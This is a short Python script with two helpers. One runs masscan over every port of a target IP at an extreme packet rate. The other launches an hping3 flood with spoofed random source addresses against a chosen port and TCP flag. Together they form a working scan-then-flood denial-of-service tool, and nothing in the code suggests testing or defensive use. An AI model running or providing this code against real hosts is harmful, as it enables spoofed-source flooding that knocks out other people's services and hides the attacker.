import subprocess

def scan_ip(ip_address):

    command = ['masscan',ip_address,'-p0-65535','--rate', '100000000','--wait', '5']

    try:
        output_lines = subprocess.run(command,capture_output=True,text=True,check=True).stdout.splitlines()
    except:
        return '扫描失败'

    open_ports = []
    for line in output_lines:
        line = line.strip()
        if 'open' in line:
            parts = line.split(' ')
            port_info = parts[3]
            port_number = port_info.split('/')[0]
            open_ports.append(f"{ip_address}:{port_number}")
    
    return open_ports

# ----------------------------------------------------------

def hping3(ip, port, time_sec, flag):

    flag = flag.upper()
    if flag not in ['A','S','F','R','P','U']:
        return False

    command = [
        'timeout', f'{time_sec}s',
        'hping3', f'-{flag}',
        ip, '-p', str(port),
        '--flood', '--rand-source'
    ]

    subprocess.Popen(command)

    return True
